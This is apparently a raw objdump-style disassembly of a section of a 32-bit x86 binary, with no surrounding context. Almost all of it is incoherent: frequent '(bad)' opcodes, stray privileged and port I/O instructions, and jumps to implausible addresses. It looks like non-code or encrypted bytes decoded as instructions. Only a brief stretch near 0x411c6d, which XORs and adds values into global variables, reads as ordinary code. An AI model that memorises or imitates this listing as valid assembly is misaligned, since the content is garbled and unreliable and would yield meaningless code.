  4118a3:	sbb    BYTE PTR [eax+0x601d3a5],dl
  4118a9:	dec    ebp
  4118aa:	jae    0x4118fa
  4118ac:	and    DWORD PTR ss:[esi+0x1f5de11c],0xa98dd0c8
  4118b7:	push   esp
  4118b8:	ins    BYTE PTR es:[edi],dx
  4118b9:	(bad)  
  4118bb:	mov    ah,0x59
  4118bd:	mov    es,edi
  4118bf:	daa    
  4118c0:	mov    ?,WORD PTR [edx+0x2]
  4118c3:	mov    edx,ds
  4118c5:	ss jae 0x4118b0
  4118c8:	icebp  
  4118c9:	mov    dh,0xb9
  4118cb:	mov    edi,0xf99452e3
  4118d0:	ja     0x4118ba
  4118d2:	adc    eax,DWORD PTR [edx+0x19]
  4118d5:	std    
  4118d6:	loop   0x4118a3
  4118d8:	sub    ah,BYTE PTR [ecx]
  4118da:	push   ds
  4118db:	pop    edi
  4118dc:	mov    esp,0xe60bd5d9
  4118e1:	push   DWORD PTR [ecx-0x25]
  4118e4:	dec    ebx
  4118e5:	mov    dh,0xc5
  4118e7:	shl    DWORD PTR [ecx-0x4c],cl
  4118ea:	cmp    esi,DWORD PTR [ecx]
  4118ec:	mov    ebx,0xabc5f549
  4118f1:	xchg   ecx,eax
  4118f2:	bound  esi,QWORD PTR ds:0x6bf88b55
  4118f8:	push   es
  4118f9:	inc    esp
  4118fa:	xchg   esi,eax
  4118fb:	jmp    0x4562790c
  411900:	in     eax,0x4e
  411902:	adc    ecx,DWORD PTR [edx+0x5457b0bb]
  411908:	sbb    ah,al
  41190a:	mov    WORD PTR [esi-0x6e8bc946],ds
  411910:	repz iret 
  411912:	or     eax,0xecc6d140
  411917:	xlat   BYTE PTR ds:[ebx]
  411918:	jge    0x4118a4
  41191a:	scas   al,BYTE PTR es:[edi]
  41191b:	dec    eax
  41191c:	jno    0x411949
  41191e:	dec    eax
  41191f:	in     al,dx
  411920:	jnp    0x411905
  411922:	int    0xc7
  411924:	sub    ah,BYTE PTR [esi+0x4861dd04]
  41192a:	mov    ebp,0x21703118
  41192f:	fs shr ebp,0xd7
  411933:	jecxz  0x41191f
  411935:	js     0x4119aa
  411937:	(bad)  
  411938:	xchg   ecx,eax
  411939:	je     0x41190e
  41193b:	dec    edx
  41193c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41193d:	push   ds
  41193e:	imul   esp,DWORD PTR [edi-0x29],0x3d
  411942:	(bad)  
  411943:	iret   
  411944:	ja     0x4118e6
  411946:	ds mov dh,0xdd
  411949:	addr16 out dx,eax
  41194b:	(bad)  
  41194c:	push   ebx
  41194d:	or     dh,dh
  41194f:	dec    edx
  411950:	rcl    DWORD PTR [ecx-0x10],cl
  411953:	pop    es
  411954:	fmul   QWORD PTR [ecx]
  411956:	inc    esp
  411957:	adc    edi,DWORD PTR [ebx]
  411959:	je     0x4118e1
  41195b:	gs jns 0x411900
  41195e:	jl     0x411999
  411960:	cmp    DWORD PTR [esp+edx*4],edi
  411963:	sahf   
  411964:	outs   dx,BYTE PTR ds:[esi]
  411965:	div    DWORD PTR [esp+edi*4]
  411968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41196a:	popa   
  41196b:	je     0x411991
  41196d:	mov    ebp,0x84cb8718
  411972:	or     eax,DWORD PTR [edi]
  411974:	shl    edx,cl
  411976:	mov    ch,BYTE PTR [edx-0x4b]
  411979:	sbb    BYTE PTR [ebx-0x2d],ch
  41197c:	push   ecx
  41197d:	or     dl,dl
  41197f:	xchg   DWORD PTR [eax],ebx
  411981:	and    edi,DWORD PTR [edi]
  411983:	imul   edi,DWORD PTR [esi-0x3],0x694579ec
  41198a:	(bad)  
  41198b:	mov    ch,0x4a
  41198d:	das    
  41198e:	xor    al,bh
  411990:	cld    
  411991:	aam    0xad
  411993:	sub    bh,BYTE PTR [ebp+esi*2+0x5a]
  411997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411998:	mov    cl,0xe7
  41199a:	dec    ebx
  41199b:	iret   
  41199c:	out    0xc2,al
  41199e:	push   ecx
  41199f:	inc    edx
  4119a0:	sbb    ecx,esi
  4119a2:	add    bl,0x89
  4119a5:	mov    eax,DWORD PTR ds:0x2eff259a
  4119ab:	les    edx,FWORD PTR [esi+0x61ee6b4]
  4119b1:	push   es
  4119b2:	xlat   BYTE PTR ds:[ebx]
  4119b3:	mov    eax,ds:0x5ce53f3e
  4119b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119b9:	jl     0x411a1b
  4119bb:	das    
  4119bc:	sbb    BYTE PTR [ecx+0x2f7dcc10],0xfb
  4119c3:	pop    ss
  4119c4:	int3   
  4119c5:	out    0x53,al
  4119c7:	call   0x3185934a
  4119cc:	xor    eax,0xedaf78bd
  4119d1:	pop    esi
  4119d2:	push   ecx
  4119d3:	inc    edi
  4119d4:	(bad)  
  4119d5:	shr    ch,1
  4119d7:	mov    ebp,0xc24bfa3c
  4119dc:	mov    ebx,ecx
  4119de:	pushf  
  4119df:	jnp    0x4119e0
  4119e1:	shl    DWORD PTR [ebx-0x5b],1
  4119e4:	jne    0x411a38
  4119e6:	adc    BYTE PTR [ecx+0x7854abf],ah
  4119ec:	pop    ds
  4119ed:	aas    
  4119ee:	cli    
  4119ef:	rcr    BYTE PTR [edx-0x71],cl
  4119f2:	pop    ecx
  4119f3:	pop    esp
  4119f4:	mov    al,gs:0x77822726
  4119fa:	and    eax,0xd92424d0
  4119ff:	fcmovne st,st(7)
  411a01:	out    0x8,al
  411a03:	push   cs
  411a04:	and    ah,BYTE PTR [esi]
  411a06:	repnz fld TBYTE PTR ss:[edi+0x5c647add]
  411a0e:	adc    BYTE PTR [esp+ecx*2+0x37],ah
  411a12:	pop    es
  411a13:	repz test al,0xe0
  411a16:	xchg   ebx,eax
  411a17:	popf   
  411a18:	out    0xd3,al
  411a1a:	(bad)  
  411a1b:	hlt    
  411a1c:	mov    al,0x94
  411a1e:	jg     0x4119f5
  411a20:	pop    ss
  411a21:	dec    esp
  411a22:	push   es
  411a23:	jne    0x4119c8
  411a25:	adc    BYTE PTR [ebp+0x37107f32],dl
  411a2b:	aaa    
  411a2c:	pusha  
  411a2d:	mov    ah,0xe9
  411a2f:	ja     0x4119c2
  411a31:	jge    0x411a93
  411a33:	adc    eax,0xa3ae46a4
  411a38:	mov    esp,0x9d86bf83
  411a3d:	cs pop esi
  411a3f:	dec    ecx
  411a40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a41:	test   eax,0xdbed5e0c
  411a46:	es cmc 
  411a48:	mov    esp,0xd9c47d5c
  411a4d:	stos   BYTE PTR es:[edi],al
  411a4e:	sub    ebp,edi
  411a50:	rep stos DWORD PTR es:[edi],eax
  411a52:	test   eax,0xeb3be1c6
  411a57:	lea    ebp,[esi-0x6dc59b7]
  411a5d:	and    cl,ah
  411a5f:	xchg   BYTE PTR [edx],ah
  411a61:	mov    ds:0x353fb5c1,eax
  411a66:	pop    esi
  411a67:	dec    eax
  411a68:	xor    esp,edi
  411a6a:	xor    edx,DWORD PTR ss:[ebp+0x5c86ae94]
  411a71:	out    dx,al
  411a72:	xor    eax,0xc45e8396
  411a77:	xchg   esi,eax
  411a78:	mov    esp,edx
  411a7a:	sbb    eax,0x1d1339c1
  411a7f:	pop    es
  411a80:	cmp    edx,DWORD PTR [ecx+ecx*8]
  411a83:	xchg   BYTE PTR [ebp+0x7bef2eea],dl
  411a89:	(bad)  
  411a8a:	adc    BYTE PTR [edx],bl
  411a8c:	lods   eax,DWORD PTR ds:[esi]
  411a8d:	adc    al,0xa9
  411a8f:	rcr    DWORD PTR [esi-0x3ba8d7be],1
  411a95:	sub    al,0x57
  411a97:	(bad)  
  411a98:	int    0x41
  411a9a:	ror    DWORD PTR [eax+ebp*8+0x45],0x4d
  411a9f:	or     dh,BYTE PTR [esi-0x4]
  411aa2:	dec    ecx
  411aa3:	sub    al,0x59
  411aa5:	dec    ebx
  411aa6:	fist   WORD PTR [esi+0x7ef6dd0e]
  411aac:	xor    WORD PTR [edi+0x45],0x48
  411ab1:	mov    ebp,cs
  411ab3:	xor    al,0x3d
  411ab5:	push   esp
  411ab6:	cmp    BYTE PTR [ebp-0x29],bl
  411ab9:	mov    ds:0x11b0a970,eax
  411abe:	stos   DWORD PTR es:[edi],eax
  411abf:	into   
  411ac0:	fs inc eax
  411ac2:	dec    ebp
  411ac3:	sbb    edx,DWORD PTR [ecx-0x16593b75]
  411ac9:	push   0x505ed1a5
  411ace:	(bad)  
  411acf:	jl     0x411a56
  411ad1:	jne    0x411a92
  411ad3:	xchg   esp,eax
  411ad4:	cld    
  411ad5:	sbb    edi,DWORD PTR [ebx]
  411ad7:	in     al,dx
  411ad8:	xchg   ecx,eax
  411ad9:	mov    BYTE PTR [eax-0x4e36eab7],0x7b
  411ae0:	xchg   esp,eax
  411ae1:	rcr    al,1
  411ae3:	adc    eax,0x6d25ec6d
  411ae8:	ret    
  411ae9:	cmp    al,0x42
  411aeb:	les    ecx,FWORD PTR [esi+edi*2+0x28]
  411aef:	iret   
  411af0:	adc    edx,DWORD PTR [edx+0x72]
  411af3:	jmp    0x7af8:0x34541f38
  411afa:	jp     0x411ac1
  411afc:	(bad)  
  411afd:	fmul   QWORD PTR [ebx]
  411aff:	(bad)  
  411b00:	(bad)  
  411b01:	(bad)  
  411b02:	push   edi
  411b03:	push   ds
  411b04:	inc    esi
  411b05:	icebp  
  411b06:	push   esp
  411b07:	test   BYTE PTR [ebx-0x65b3aad8],cl
  411b0d:	leave  
  411b0e:	lods   eax,DWORD PTR ds:[esi]
  411b0f:	and    DWORD PTR [ebp+0x3c26190],ebx
  411b15:	pop    ebx
  411b16:	lods   eax,DWORD PTR ds:[esi]
  411b17:	fcomp  DWORD PTR [esi+0x63e85696]
  411b1d:	hlt    
  411b1e:	or     BYTE PTR [edi+0x3d6b065],bl
  411b24:	inc    ebx
  411b25:	mov    bh,0xd9
  411b27:	test   eax,0xabc9a6d6
  411b2c:	push   esi
  411b2d:	xor    al,0xd1
  411b2f:	mov    ecx,0xd1afc887
  411b34:	(bad)  
  411b35:	bound  edi,QWORD PTR [ebp-0x59b033e0]
  411b3b:	jno    0x411b63
  411b3d:	push   edx
  411b3e:	loopne 0x411b62
  411b40:	cmp    al,BYTE PTR [edi+esi*8]
  411b43:	lods   al,BYTE PTR ds:[esi]
  411b44:	jl     0x411b21
  411b46:	fdiv   DWORD PTR [ebp-0x15]
  411b49:	ret    0x66f4
  411b4c:	ins    BYTE PTR es:[edi],dx
  411b4d:	pop    ecx
  411b4e:	mov    edi,0x237eb099
  411b53:	sti    
  411b54:	xchg   esi,eax
  411b55:	jge    0x411b5d
  411b57:	mov    ecx,0x526eb411
  411b5c:	jge    0x411b03
  411b5e:	push   edx
  411b5f:	push   es
  411b60:	(bad)  [edx+0x73195759]
  411b66:	iret   
  411b67:	cmp    esp,DWORD PTR [edx+0x1d]
  411b6a:	ins    DWORD PTR es:[edi],dx
  411b6b:	mov    WORD PTR [ebx],ds
  411b6d:	retf   0x5ba6
  411b70:	sub    esi,DWORD PTR [ebx+0xcb02c89]
  411b76:	xchg   esp,eax
  411b77:	je     0x411bbf
  411b79:	sub    ebx,DWORD PTR [edx]
  411b7b:	cmp    BYTE PTR [ecx+ebp*8+0x7c6a71d7],0x14
  411b83:	add    DWORD PTR [ebx-0x209af92b],ecx
  411b89:	call   FWORD PTR [ebx-0x6b]
  411b8c:	popf   
  411b8d:	test   BYTE PTR [eax],bl
  411b8f:	(bad)
  411b92:	adc    bl,ah
  411b94:	sub    DWORD PTR [ebp-0x2],0xfffffff9
  411b98:	outs   dx,BYTE PTR ds:[esi]
  411b99:	xchg   esi,eax
  411b9a:	mov    ds:0x9f368078,eax
  411b9f:	dec    ebp
  411ba0:	xchg   ecx,eax
  411ba1:	shl    DWORD PTR [ebx-0x79],0x37
  411ba5:	xchg   ebp,eax
  411ba6:	call   0xb4fbec0d
  411bab:	jns    0x411c11
  411bad:	sub    dh,BYTE PTR [edx+ebp*2]
  411bb0:	int3   
  411bb1:	and    esp,ebp
  411bb3:	mov    bl,0x1c
  411bb5:	dec    ecx
  411bb6:	retf   0xdfd7
  411bb9:	ins    DWORD PTR es:[edi],dx
  411bba:	xor    dh,BYTE PTR [eax-0x66]
  411bbd:	push   ebx
  411bbe:	push   esi
  411bbf:	fs ror eax,cl
  411bc2:	enter  0x7cad,0x52
  411bc6:	pop    ds
  411bc7:	cs dec esi
  411bc9:	pop    ebx
  411bca:	adc    dl,bh
  411bcc:	bound  esi,QWORD PTR [esi+eax*8]
  411bcf:	push   ebx
  411bd0:	pop    eax
  411bd1:	fbld   TBYTE PTR [ebx]
  411bd3:	fldpi  
  411bd5:	mov    cl,dh
  411bd7:	xchg   esp,eax
  411bd8:	in     eax,dx
  411bd9:	ror    edx,0x74
  411bdc:	repz iret 
  411bde:	cdq    
  411bdf:	jmp    0x30b899d3
  411be4:	or     DWORD PTR [edx-0x715ab4ae],eax
  411bea:	mov    eax,ds:0xf1c80bb9
  411bef:	sub    al,BYTE PTR [edx+ebp*4-0x60]
  411bf3:	sub    BYTE PTR [edi-0x1c],bl
  411bf6:	jbe    0x411c51
  411bf8:	pop    es
  411bf9:	or     eax,0x4f06c250
  411bfe:	pop    edi
  411bff:	ds push cs
  411c01:	mov    eax,0x53f7e0ea
  411c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c07:	sahf   
  411c08:	and    DWORD PTR [edi-0x15],edi
  411c0b:	pop    ebp
  411c0c:	js     0x411bca
  411c0e:	add    ch,BYTE PTR [esi+eiz*4]
  411c11:	mov    cl,0xec
  411c13:	aad    0x1c
  411c15:	push   cs
  411c16:	inc    ebx
  411c17:	push   ebx
  411c18:	ss out 0x9f,eax
  411c1b:	bound  edi,QWORD PTR [edi+0x3f9634ac]
  411c21:	xor    al,0xb6
  411c23:	lods   eax,DWORD PTR ds:[esi]
  411c24:	mov    eax,0x679910fa
  411c29:	push   es
  411c2a:	sub    al,0xef
  411c2c:	pop    edi
  411c2d:	fst    QWORD PTR [ebx-0x69]
  411c30:	inc    edx
  411c31:	js     0x411c1b
  411c33:	xor    edi,DWORD PTR [ecx]
  411c35:	cmc    
  411c36:	mov    ah,0x50
  411c38:	int3   
  411c39:	retf   
  411c3a:	test   DWORD PTR [esi],0x8bb1b269
  411c40:	das    
  411c41:	in     al,0x18
  411c43:	sub    cl,BYTE PTR [eax+ebp*8-0x73]
  411c47:	jb     0x411c7b
  411c49:	loope  0x411c6c
  411c4b:	mov    edi,0xdd561e8b
  411c50:	idiv   BYTE PTR [eax+0x2312992a]
  411c56:	lock pusha 
  411c58:	xor    BYTE PTR [esi+0x51aa87e5],al
  411c5e:	stos   BYTE PTR es:[edi],al
  411c5f:	inc    edi
  411c60:	out    dx,al
  411c61:	sub    DWORD PTR [eax+eiz*4+0x7efcf8be],ebp
  411c68:	dec    ecx
  411c69:	and    BYTE PTR [ebx-0x28],ch
  411c6c:	inc    ebx
  411c6d:	mov    eax,ds:0x41b22c
  411c72:	add    eax,DWORD PTR ds:0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0xd41fff5e
  411cb8:	mov    ch,0x5e
  411cba:	push   ebx
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411cb3
  411cc2:	sti    
  411cc3:	hlt    
  411cc4:	(bad)  
  411cc5:	fwait
  411cc6:	lahf   
  411cc7:	xchg   ecx,eax
  411cc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cc9:	inc    esi
  411cca:	shl    DWORD PTR [edx-0x42bf9352],0xd5
  411cd1:	push   ebp
  411cd2:	in     al,0xe6
  411cd4:	mov    edi,DWORD PTR [esi-0x25]
  411cd7:	mov    BYTE PTR [esi],bl
  411cd9:	mov    cl,0x42
  411cdb:	xchg   esi,eax
  411cdc:	pop    ss
  411cdd:	add    DWORD PTR [ecx-0x74],ebx
  411ce0:	sbb    ecx,ebp
  411ce2:	mov    DWORD PTR [edx],edx
  411ce4:	test   DWORD PTR [eax],0xef8e6c18
  411cea:	js     0x411d47
  411cec:	lods   eax,DWORD PTR ds:[esi]
  411ced:	xor    al,dl
  411cef:	push   ss
  411cf0:	test   DWORD PTR [esi+0x4d09d915],ebx
  411cf6:	push   edx
  411cf7:	fsubp  st(5),st
  411cf9:	rcl    edx,cl
  411cfb:	(bad)  
  411cfc:	(bad)  
  411cfd:	jle    0x411ca3
  411cff:	lods   al,BYTE PTR ds:[esi]
  411d00:	(bad)  ds:0xde748993
  411d06:	sub    al,0xc7
  411d08:	mov    eax,0x308dd9ca
  411d0d:	in     al,dx
  411d0e:	mov    edx,eax
  411d10:	leave  
  411d11:	pop    edx
  411d12:	cs pop ebp
  411d14:	add    eax,0x6caf60ae
  411d19:	sub    BYTE PTR [eax+0x2f],0x3e
  411d1d:	mov    DWORD PTR [edi],ecx
  411d1f:	div    BYTE PTR [eax]
  411d21:	test   eax,0x9725463
  411d26:	cmp    eax,0xafa2255b
  411d2b:	push   eax
  411d2c:	pusha  
  411d2d:	icebp  
  411d2e:	ficomp WORD PTR ds:[esi-0x4e926c1]
  411d35:	repnz add ebp,DWORD PTR [esi]
  411d38:	mov    bh,0xf4
  411d3a:	pop    ss
  411d3b:	dec    esp
  411d3c:	dec    eax
  411d3d:	test   al,0xc9
  411d3f:	dec    ebp
  411d40:	dec    eax
  411d41:	cmp    dl,BYTE PTR [esi]
  411d43:	or     esi,DWORD PTR [ecx+0x3b]
  411d46:	(bad)  
  411d47:	sub    BYTE PTR [ebx-0x32],bh
  411d4a:	or     eax,0x7909598c
  411d4f:	inc    edx
  411d50:	dec    edi
  411d51:	imul   eax,DWORD PTR [edi],0xffffffb1
  411d54:	std    
  411d55:	test   DWORD PTR [ebp-0x44b329cd],ecx
  411d5b:	fiadd  WORD PTR [ebp-0x1d71923c]
  411d61:	jg     0x411d18
  411d63:	sti    
  411d64:	add    al,0x26
  411d66:	fdiv   DWORD PTR [ecx]
  411d68:	xor    DWORD PTR [esi+ebp*2-0x9],esi
  411d6c:	mov    ecx,DWORD PTR [edx]
  411d6e:	inc    esp
  411d6f:	sar    BYTE PTR [ecx-0x5b0f6964],1
  411d75:	sub    bh,BYTE PTR [edi-0x15]
  411d78:	ins    BYTE PTR es:[edi],dx
  411d79:	arpl   WORD PTR [ebx-0xc],bp
  411d7c:	in     al,0x1
  411d7e:	xor    cl,BYTE PTR [edi-0xaacd559]
  411d84:	mov    eax,ds:0x5146ba94
  411d89:	push   edx
  411d8a:	push   ecx
  411d8b:	push   cs
  411d8c:	lods   al,BYTE PTR ds:[esi]
  411d8d:	sub    bl,BYTE PTR [ebp+0x3f2346fd]
  411d93:	mov    dl,0xed
  411d95:	test   dh,cl
  411d97:	out    dx,al
  411d98:	scas   al,BYTE PTR es:[edi]
  411d99:	dec    ebp
  411d9a:	out    0x2c,eax
  411d9c:	clc    
  411d9d:	les    eax,FWORD PTR ds:0x58973494
  411da3:	mov    al,0x2c
  411da5:	fild   QWORD PTR [edx+0x29]
  411da8:	and    BYTE PTR [esi-0x62],bh
  411dab:	(bad)  [edi]
  411dad:	mov    ch,0x74
  411daf:	and    eax,0xbe899315
  411db4:	(bad)  
  411db6:	lock sub al,BYTE PTR [eax+0x18]
  411dba:	pop    esp
  411dbb:	push   0xd57e4376
  411dc0:	push   0x4c
  411dc2:	nop
  411dc3:	pop    edi
  411dc4:	icebp  
  411dc5:	pop    esp
  411dc6:	sbb    DWORD PTR [eax-0x3316a3e9],ebx
  411dcc:	scas   eax,DWORD PTR es:[edi]
  411dcd:	push   ss
  411dce:	adc    al,BYTE PTR [edx-0x64]
  411dd1:	mov    dh,0xb5
  411dd3:	loope  0x411e17
  411dd5:	retf   
  411dd6:	loope  0x411d93
  411dd8:	jne    0x411d63
  411dda:	adc    DWORD PTR [eax+0x21a65191],ebp
  411de0:	ss mov esp,?
  411de3:	stos   DWORD PTR es:[edi],eax
  411de4:	fs jns 0x411de8
  411de7:	inc    ecx
  411de8:	repnz or bh,dh
  411deb:	cmp    BYTE PTR [eax+0x72],al
  411dee:	pusha  
  411def:	adc    dl,BYTE PTR [ecx]
  411df1:	mov    ebp,0x2dd1edfe
  411df6:	es mov esp,0xfb957ac1
  411dfc:	xor    dl,BYTE PTR [esi-0x80]
  411dff:	in     eax,dx
  411e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e01:	mov    ah,0xd1
  411e03:	cmp    DWORD PTR ds:0x21163576,edx
  411e09:	pop    es
  411e0a:	push   edx
  411e0b:	outs   dx,DWORD PTR ds:[esi]
  411e0c:	dec    ebx
  411e0d:	sub    eax,0x105d9213
  411e12:	jnp    0x411e04
  411e14:	out    0xa1,al
  411e16:	and    al,0x31
  411e18:	(bad)  
  411e19:	aad    0xad
  411e1b:	xchg   ebx,eax
  411e1c:	push   esp
  411e1d:	imul   eax,ebp,0x5f
  411e20:	ret    
  411e21:	stos   BYTE PTR es:[edi],al
  411e22:	and    eax,0xf0b6a5b1
  411e27:	shl    BYTE PTR [ebx+ebp*1],cl
  411e2a:	test   BYTE PTR ds:0xdc240c27,cl
  411e30:	fimul  DWORD PTR [ebp-0x55]
  411e33:	push   esi
  411e34:	mov    ah,0x66
  411e36:	jle    0x411e86
  411e38:	cmc    
  411e39:	and    DWORD PTR [ebp-0x71],edi
  411e3c:	(bad)  
  411e3d:	out    dx,al
  411e3e:	jg     0x411dd5
  411e40:	shl    DWORD PTR [esi+0x2a495da7],cl
  411e46:	pop    DWORD PTR [ebx+0x349c1ed6]
  411e4c:	push   ebx
  411e4d:	mov    edi,0x710e4769
  411e52:	mov    WORD PTR [edi],es
  411e54:	pop    ss
  411e55:	je     0x411ec9
  411e57:	pop    ds
  411e58:	hlt    
  411e59:	in     eax,0xdf
  411e5b:	push   cs
  411e5c:	cli    
  411e5d:	ss jns 0x411e73
  411e60:	(bad)  
  411e62:	mov    ch,0xe7
  411e64:	cmp    al,0xbd
  411e66:	(bad)  
  411e67:	les    edi,FWORD PTR [eax+0x7a]
  411e6a:	mov    DWORD PTR [ebp-0x2a92135a],ecx
  411e70:	or     eax,0x207c173f
  411e75:	out    0xc8,al
  411e77:	push   ebp
  411e78:	dec    esi
  411e7a:	nop
  411e7b:	dec    ebx
  411e7c:	test   eax,0x9614d7e1
  411e81:	cmc    
  411e82:	ins    DWORD PTR es:[edi],dx
  411e83:	sbb    BYTE PTR [edx],cl
  411e85:	bound  ebp,QWORD PTR [ecx]
  411e87:	mov    al,0x74
  411e89:	in     al,dx
  411e8a:	jl     0x411e9b
  411e8c:	or     BYTE PTR [ecx-0x5c],dh
  411e8f:	xlat   BYTE PTR ds:[ebx]
  411e90:	std    
  411e91:	out    dx,eax
  411e92:	arpl   WORD PTR [edx-0x3f99a3e3],ax
  411e98:	daa    
  411e99:	mov    eax,0xe0da05db
  411e9e:	jl     0x411f0c
  411ea0:	pop    esi
  411ea1:	ret    0x728a
  411ea4:	(bad)  
  411ea5:	mov    bh,0x66
  411ea7:	push   ss
  411ea8:	(bad)  
  411ea9:	push   DWORD PTR [eax+0x32]
  411eac:	(bad)  
  411ead:	and    al,0x1f
  411eaf:	(bad)  
  411eb0:	add    cl,dh
  411eb2:	mov    edx,?
  411eb4:	pop    eax
  411eb5:	arpl   WORD PTR [ebp+0x19],sp
  411eb8:	or     al,dl
  411eba:	jmp    0x6eee2c41
  411ebf:	dec    ebx
  411ec0:	mov    dh,0x8c
  411ec2:	fwait
  411ec3:	inc    edx
  411ec4:	retf   
  411ec5:	jge    0x411ec6
  411ec7:	and    al,0x15
  411ec9:	shl    DWORD PTR [ebp-0x4e],cl
  411ecc:	cmp    bh,bl
  411ece:	loope  0x411f37
  411ed0:	out    0x4a,eax
  411ed2:	push   eax
  411ed3:	scas   eax,DWORD PTR es:[edi]
  411ed4:	adc    cl,ch
  411ed6:	lock shr bh,cl
  411ed9:	clc    
  411eda:	mov    ds:0x17579480,al
  411edf:	jnp    0x411f1b
  411ee1:	mov    esp,0xa97e9f1e
  411ee6:	inc    eax
  411ee7:	test   eax,0xda1e5d52
  411eec:	loope  0x411f4c
  411eee:	ss out 0x1e,al
  411ef1:	add    DWORD PTR [edi-0x63],0xfffffff1
  411ef5:	iret   
  411ef6:	stc    
  411ef7:	xor    al,0x6a
  411ef9:	iret   
  411efa:	sub    DWORD PTR [edx-0x34800f34],ebp
  411f00:	out    dx,al
  411f01:	fwait
  411f02:	xchg   edx,eax
  411f03:	shr    BYTE PTR [ecx],cl
  411f05:	in     eax,0x59
  411f07:	push   es
  411f08:	mov    al,0xbe
  411f0a:	mov    bh,0xcb
  411f0c:	jl     0x411f28
  411f0e:	xchg   ebx,eax
  411f0f:	push   edi
  411f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f11:	jnp    0x411f60
  411f13:	jmp    0xe658681b
  411f18:	nop
  411f19:	xor    ebx,DWORD PTR [edx+0x76f90293]
  411f1f:	jne    0x411ec9
  411f21:	sub    esp,edi
  411f23:	sub    BYTE PTR ds:0xfde76afd,ch
  411f29:	fwait
  411f2a:	add    DWORD PTR [eax+0x229f1707],esp
  411f30:	mov    ebp,0x48209801
  411f35:	in     eax,0x20
  411f37:	sub    DWORD PTR [eax-0x23],edi
  411f3a:	push   esi
  411f3b:	inc    ebx
  411f3c:	push   ds
  411f3d:	push   esp
  411f3e:	ret    
  411f3f:	ins    BYTE PTR es:[edi],dx
  411f40:	fild   WORD PTR [ebx+0x695a8ffa]
  411f46:	cli    
  411f47:	in     al,dx
  411f48:	loopne 0x411fa9
  411f4a:	arpl   WORD PTR [ecx+0x25],cx
  411f4d:	jg     0x411f90
  411f4f:	push   ecx
  411f50:	call   FWORD PTR [ecx]
  411f52:	aad    0x42
  411f54:	sbb    BYTE PTR [ebx+0x27],dl
  411f57:	enter  0xcb6d,0xec
  411f5b:	xlat   BYTE PTR ds:[ebx]
  411f5c:	pop    esp
  411f5d:	push   esp
  411f5e:	shr    BYTE PTR [eax+esi*4],cl
  411f61:	mov    bh,0xc6
  411f63:	(bad)  
  411f64:	jp     0xc0667c5c
  411f6a:	fld    TBYTE PTR [eax]
  411f6c:	xchg   edx,eax
  411f6d:	mov    dh,0x12
  411f6f:	stos   DWORD PTR es:[edi],eax
  411f70:	xchg   edi,eax
  411f71:	sbb    eax,0x4c51b837
  411f76:	pusha  
  411f77:	jb     0x411f32
  411f79:	xlat   BYTE PTR ds:[bx]
  411f7b:	xor    bl,dl
  411f7d:	push   edi
  411f7e:	out    dx,al
  411f7f:	fs popa 
  411f81:	loop   0x411fe1
  411f83:	add    BYTE PTR [edi],ch
  411f85:	push   eax
  411f86:	mov    WORD PTR [eax],?
  411f88:	gs cmp al,0x8d
  411f8b:	inc    esp
  411f8c:	rcl    dh,cl
  411f8e:	sub    eax,0xfa7db776
  411f93:	dec    esi
  411f94:	mov    BYTE PTR [edi-0x492d7359],ch
  411f9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f9b:	es es rol DWORD PTR gs:[edx-0x3e],0x28
  411fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fa4:	mov    ah,0x34
  411fa6:	loopne 0x412016
  411fa8:	add    dl,bl
  411faa:	loopne 0x411f72
  411fac:	mov    ah,ah
  411fae:	xor    esp,DWORD PTR [ebx+0x57]
  411fb1:	xlat   BYTE PTR ds:[ebx]
  411fb2:	push   es
  411fb3:	xlat   BYTE PTR ds:[ebx]
  411fb4:	jmp    0x3d9fe6f
  411fb9:	rol    BYTE PTR [eax-0x41],cl
  411fbc:	ds in  al,dx
  411fbe:	mov    ecx,0xadb31785
  411fc3:	inc    esp
  411fc4:	pop    edi
  411fc5:	ja     0x411ff6
  411fc7:	jne    0x411f62
  411fc9:	jns    0x411fc0
  411fcb:	scas   al,BYTE PTR es:[edi]
  411fcc:	dec    edi
  411fcd:	push   eax
  411fce:	sub    BYTE PTR [edx-0x7e91f205],cl
  411fd4:	cwde   
  411fd5:	pop    esi
  411fd6:	rcr    BYTE PTR [edx-0x5a],cl
  411fd9:	mov    esi,0x43dac0e0
  411fde:	mov    ds:0xf901bf55,eax
  411fe3:	cli    
  411fe4:	(bad)  
  411fe5:	and    cl,BYTE PTR [ebx+ebx*1-0x543e8230]
  411fec:	aaa    
  411fed:	add    eax,0x521a9c83
  411ff2:	pop    ecx
  411ff3:	push   es
  411ff4:	mov    ch,0x8f
  411ff6:	(bad)  
  411ff7:	sub    eax,0x93d7d06e
  411ffc:	push   0x44ffacb0
  412001:	or     esp,DWORD PTR [edi]
  412003:	(bad)  
  412005:	jmp    0x411fbe
  412007:	lock outs dx,BYTE PTR ds:[esi]
  412009:	out    0xf6,al
  41200b:	aad    0x74
  41200d:	call   0x2db0:0xd4132509
  412014:	out    0x9a,al
  412016:	inc    esi
  412017:	sub    al,0x2c
